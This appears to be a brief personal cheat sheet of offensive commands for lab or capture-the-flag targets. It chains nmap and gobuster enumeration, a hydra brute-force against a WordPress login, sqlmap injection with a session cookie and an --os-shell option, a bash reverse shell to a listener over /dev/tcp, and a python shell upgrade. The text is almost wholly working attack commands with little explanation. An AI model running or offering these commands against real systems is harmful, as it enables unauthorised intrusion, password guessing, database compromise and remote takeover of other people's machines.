##We are going to do basic of Hacking

#Enumeration
1. nmap -Sc -sV <`ip address>
2. nmap -sT <'ip address>
3. nmap -sP <'ip address>

#Enumeration
1. gobuster dir -u <`ip address> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

#BruteForcing

1. hydra -L fsocity.txt -p mypassword 192.168.10.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"

Sqlmap
1. sqlmap -u 'http://10.129.233.138/dashboard.php?search=any+query' --cookie="PHPSESSID=9qik8dt7ol8fpsbi63t0beft1l"
2. sqlmap -u 'http://10.129.233.138/dashboard.php?search=any+query' --cookie="PHPSESSID=9qik8dt7ol8fpsbi63t0beft1l" --os-shell


reverse shell
1. bash -c "bash -i >& /dev/tcp/10.10.14.161/443 0>&1"
pty enable
1. python3 -c 'import pty; pty.spawn("/bin/bash")'